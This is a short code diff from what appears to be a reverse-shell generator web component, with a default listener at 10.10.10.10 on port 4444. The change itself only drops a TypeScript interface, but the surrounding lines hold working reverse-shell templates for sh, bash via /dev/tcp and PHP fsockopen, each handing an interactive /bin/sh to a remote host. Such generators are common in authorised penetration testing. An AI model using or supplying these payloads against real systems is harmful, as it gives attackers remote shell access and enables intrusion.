@@ -5,13 +5,7 @@ const host = ref('10.10.10.10')
 const port = ref('4444')
 const copied = ref<string | null>(null)
 
-interface Shell {
-  id: string
-  label: string
-  build: (h: string, p: string) => string
-}
-
-const shells: Shell[] = [
+const shells = [
   { id: 'sh', label: 'SH', build: (h, p) => `sh -i >& /dev/tcp/${h}/${p} 0>&1` },
   { id: 'bash', label: 'Bash', build: (h, p) => `bash -i >& /dev/tcp/${h}/${p} 0>&1` },
   { id: 'php', label: 'PHP', build: (h, p) => `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'` },
